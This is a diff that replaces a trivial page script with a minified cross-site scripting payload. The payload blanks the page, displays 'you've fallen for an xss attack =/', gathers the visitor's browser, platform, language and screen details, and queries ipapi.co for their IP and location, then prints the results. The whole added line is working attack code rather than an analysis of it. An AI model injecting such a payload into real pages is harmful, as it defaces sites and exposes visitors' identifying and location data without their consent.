@@ -1,7 +1,1 @@
-document.documentElement.innerHTML = "";
-const app = document.createElement("div");
-app.id = "app";
-app.innerHTML = `
-    <h1>hello</h1>
-    <p>for xd</p>
-`;document.documentElement.appendChild(app);
+document.head.innerHTML="";document.body.innerHTML="";Object.assign(document.body.style,{margin:"0",height:"100vh",backgroundColor:"black",color:"white",textAlign:"center",overflow:"hidden"});let bg=document.body.appendChild(Object.assign(document.createElement("div"),{id:"bg"}));Object.assign(bg.style,{position:"fixed",top:0,left:0,width:"100%",height:"100%",backgroundImage:"url('https://i.ibb.co/8gJgdrQf/bg.jpg')",backgroundSize:"cover",backgroundPosition:"center",opacity:"0.05",transition:"opacity 2s ease",zIndex:"-1"});let container=document.body.appendChild(document.createElement("div"));Object.assign(container.style,{position:"absolute",top:"50%",left:"50%",transform:"translate(-50%,-50%)"});let title=container.appendChild(document.createElement("h1"));title.textContent="you've fallen for an xss attack =/";Object.assign(title.style,{transition:"opacity 1s ease,max-height 1s ease",overflow:"hidden",maxHeight:"500px",margin:"10px 0",padding:"10px 0"});let output=container.appendChild(document.createElement("pre"));output.id="output";output.textContent="load";async function g(){let n={userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language,screen:{width:screen.width,height:screen.height}};try{n.ipInfo=await(await fetch("https://ipapi.co/json/")).json()}catch{n.ip="err"}return n}g().then(i=>{output.textContent=JSON.stringify(i,null,2);bg.style.opacity=0;title.style.opacity=0;title.style.maxHeight="0";title.style.margin="0";title.style.padding="0"});
